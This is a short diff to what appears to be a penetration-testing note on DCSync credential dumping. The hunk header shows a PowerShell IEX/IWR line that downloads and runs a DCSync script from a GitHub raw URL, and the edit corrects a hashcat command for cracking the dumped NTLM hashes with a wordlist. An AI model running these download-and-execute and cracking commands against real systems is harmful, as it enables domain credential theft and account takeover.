@@ -13,5 +13,5 @@ IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-
 
 The results can be copied over to file and run againt Hashcat
 ```
-hashcat -a 0 -m 1000 hashes Wordlists/rockyou2021.txt
+hashcat -a 0 -m 1000 hashes.txt Wordlists/rockyou2021.txt
 ```
